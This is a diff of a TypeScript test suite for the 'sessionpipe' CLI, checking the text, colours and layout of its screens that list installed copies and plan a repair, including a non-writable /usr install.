+  it("what is no install is said once, on its row of what is left: the table has no row for it, and counts the copies alone", () => {
+    const table = found(PLAIN, i, f);
     const rows = planned(PLAIN, p).join("\n");
-    for (const why of [CHECKOUT, "Volta keeps it", "a file of that name that npm didn't put there"]) {
-      expect(table).not.toContain(why);
+    for (const why of [CHECKOUT, "Volta keeps it", "a file npm didn't put there"]) {
+      expect(table.join("\n")).not.toContain(why);
       expect(rows.split(why)).toHaveLength(2);
     }
-    expect(table.match(/ · not an install$/gm)).toHaveLength(2);
-    // The file that is no install is no finding, and no copy: only a row of what is left.
-    expect(table).not.toContain("/home/u/bin/sessionpipe");
+    // Six copies: the five that are ours to remove and the one that needs sudo for it.
+    expect(table.slice(0, 7)).toEqual([
+      "Found 6 copies of sessionpipe on this computer",
+      "  · 1.1.0      ~/.local                      you type this",
+      "  · 1.1.0      ~/.nvm/versions/node/v22.1.0  the background service, the hooks",
+      "  · 1.2.0      ~/.npm/_npx/0a1b2c3d4e5f6a7b  this command",
+      "  ✗ 1.0.0      /opt/homebrew                 nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
+      "  ✗ left over  /usr/local                    nothing uses it · left behind by an install that was cut off",
+      "  · 1.0.0      /usr                          nothing uses it",
+    ]);
+    expect(table.join("\n")).not.toMatch(/not an install|~\/code|\.volta|\/home\/u\/bin/);
     // What is found beside the copies is what the plan answers: the link, and the daemon.
-    expect(found(PLAIN, i, f).slice(-4)).toEqual([
+    expect(table.slice(7)).toEqual([
       "",
       "Also found",
       "  ! /usr/local/bin/sessionpipe is a link to a sessionpipe that is gone",
       "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
     ]);
+  });
+
+  it("the line that needs sudo is the plan's to keep for the end of a run: the folder and its own link by name, and never on this screen", () => {
+    const usr = p.left.find((l) => l.ours);
+    const [dir, link] = [slotIn(folder("/usr")), path.join(folder("/usr"), "bin", "sessionpipe")];
+    expect(usr?.line).toBe(`sudo rm -r ${shq(dir, "linux")} ${shq(link, "linux")}`);
+    expect(usr?.line).not.toMatch(/npm|uninstall/);
+    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
+      const screen = [...found(ui, i, f), ...planned(ui, p)].map(plain).join("\n");
+      expect(screen).not.toMatch(/sudo (rm|npm)|uninstall -g/);
+      expect(screen).not.toContain(dir);
+    }
   });
 
   it("at 80 columns and at 120 both screens fit, in colour and without it, and say what the whole lines say", () => {
@@ -1413,23 +1772,48 @@ describe("the two screens of a real repair, from the plan itself", () => {
       expect(start(tint(ui, "yellow", "~ switch "))).toBe(1);
       expect(start(tint(ui, "bold", tint(ui, "red", "- remove ")))).toBe(5);
       expect(start(tint(ui, "dim", "= keep   "))).toBe(1);
-      // The command a tool of its own removes its copy with is whole, in its colour; the
-      // line that needs sudo is not on the screen.
+      // The command a tool of its own removes its copy with is whole, in its colour.
       expect(lines).toContain(`      Volta keeps it: ${tint(ui, "cyan", "`volta uninstall sessionpipe`")} removes it`);
-      expect(lines.map(plain).join("\n")).not.toContain("sudo npm");
-      // The notes are marked, and what keeps it safe ends the screen in plain text.
-      expect(
-        lines.filter((l) => l.startsWith(`  ${mark(ui, "warn")} `) && !plain(l).startsWith("  ! /usr")),
-      ).toHaveLength(2);
+      // The one row marked in yellow is the copy that would have gone, and what keeps it
+      // safe ends the screen in plain text.
+      expect(lines.filter((l) => l.startsWith(`  ${mark(ui, "warn")} `)).map(plain)).toEqual(["  ! /usr"]);
       expect(lines.slice(-3)).toEqual(["", SAFE, RESTARTS]);
     }
-    // At 80 columns each of the two notes takes a second line, under its own words.
-    const notes = planned(TTY, p).slice(-8, -3);
-    expect(notes[0]).toBe("");
-    expect(notes.slice(1).map((l) => plain(l).slice(0, 4))).toEqual(["  ! ", "    ", "  ! ", "    "]);
-    expect(notes[3]).toBe(
-      `  ${mark(TTY, "warn")} Typing ${tint(TTY, "cyan", "`sessionpipe`")} starts /home/u/bin/sessionpipe, not the copy in`,
-    );
-    expect(notes[4]).toBe("    ~/.local.");
+  });
+});
+
+describe("the screen of a home this user may not write, from the plan itself", () => {
+  // As after `sudo npm install -g`: the copy that is typed is whole and the newest, in a
+  // prefix that is not this user's; an older copy of the user's own is beside it. Nothing
+  // runs in the background, and something here needs the service.
+  const usr = copy("/usr", { uses: ["typed", "this", "hooks"], writable: false });
+  const stray = copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0" });
+  const i = inv([usr, stray], { home: home("/usr", { writable: false }) });
+  const p = plan(i, facts());
+
+  it("M3: the copy stays as the first row, nothing is installed, and with no safety line the screen ends with the note", () => {
+    expect(p.stays).toBe("1.2.0 in /usr as it is: whole, the newest, and not yours to write");
+    expect(p.steps.map((s) => s.do)).toEqual(["use", "remove", "prove"]);
+    expect(p.safety).toEqual([]);
+    expect(planned(PLAIN, p)).toEqual([
+      "This will",
+      "  = keep     1.2.0 in /usr as it is: whole, the newest, and not yours to write",
+      "  ~ switch   the hooks to it",
+      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
+      "  = keep     pairings, settings, keys, messages waiting to be sent",
+      "",
+      "  ! The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
+    ]);
+    for (const [ui, columns] of [
+      [TTY, 80],
+      [WIDE, 120],
+    ] as const) {
+      const lines = planned(ui, p);
+      fits(lines, planned(PLAIN, p), columns);
+      // Both rows of what is kept are dim, and no row is green: nothing is added.
+      expect(lines.filter((l) => l.startsWith(`  ${tint(ui, "dim", "= keep   ")}  `))).toHaveLength(2);
+      expect(lines.join("\n")).not.toContain(`${ESC}[32m`);
+      expect(plain(lines.at(-1) as string)).toMatch(/`sessionpipe control run` does\.$/);
+    }
   });
 });
